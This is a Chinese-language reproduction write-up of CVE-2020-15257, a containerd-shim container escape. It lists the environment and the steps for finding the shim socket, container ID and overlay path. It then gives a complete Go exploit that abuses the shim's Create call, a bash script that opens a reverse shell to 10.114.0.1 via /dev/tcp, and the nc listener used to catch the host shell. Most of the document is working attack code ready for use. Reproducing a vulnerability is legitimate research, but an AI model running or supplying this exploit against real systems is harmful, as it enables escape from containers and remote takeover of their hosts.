# CVE-2020-15257 复现

---

## 环境

* Linux: Ubuntu 18.04
* Docker: 19.03.13
* containerd: 1.3.7

---

## 步骤

首先创建一个容器，进入容器分别获取containerd-shim的socket路径（/containerd-shim/xxx.sock）、容器的ID（/docker/xxx后面那串）、容器根目录在宿主中的路径（upperdir=/var/lib/docker/overlay2/xxx/diff）。

![](img/15257_containerd-shim_sock.png)

![](img/15257_docker_id.png)

![](img/15257_upperdir.png)

编写[exp](exp/main.go)，填入上面得到的内容并编译：

```go
package main

import (
    "context"
    "net"
    "github.com/containerd/ttrpc"
    shimapi "github.com/containerd/containerd/runtime/v1/shim/v1"
)

func main() {
    sock := "/containerd-shim/5839ead536d064225e761605be1345b36a3b6c6b7b1c098ff67289f157fc8bb8.sock"

    docker_id := "340968a5fb669499bb01d1517f3ecaf064ec061f88b2290d0bdd17f3479b60da"

    diff := "/var/lib/docker/overlay2/97df8534e2ea655bbf917705531a0f2a9c1a5bdddbf13a0a7524aff616bd53d9/diff/"

    conn, _ := net.Dial("unix", "\x00"+sock)

    client := ttrpc.NewClient(conn)
    shimClient := shimapi.NewShimClient(client)

    ctx := context.Background()
    md := ttrpc.MD{} 
    md.Set("containerd-namespace-ttrpc", "notmoby")
    ctx = ttrpc.WithMetadata(ctx, md)

    shimClient.Create(ctx, &shimapi.CreateTaskRequest{
        ID: docker_id,
        Bundle: "/run/containerd/io.containerd.runtime.v1.linux/moby/"+docker_id+"/config.json",
        Stdout: "binary:///bin/sh?-c="+diff+"exp.sh",
    })
}
```

在根目录创建一个用于触发的shell文件（[exp.sh](exp.sh)），内容为反弹一个shell到**10.114.0.1**所在的机器（攻击端）：

```shell
#!/bin/bash
/bin/bash -i >& /dev/tcp/10.114.0.1/1234 0>&1
```

进入10.114.0.1，开启监听：

```shell
nc -lvp 1234
```

在容器中运行exp，回到攻击端，可以看到来自容器宿主的shell：

![](img/15257_shell_rev.png)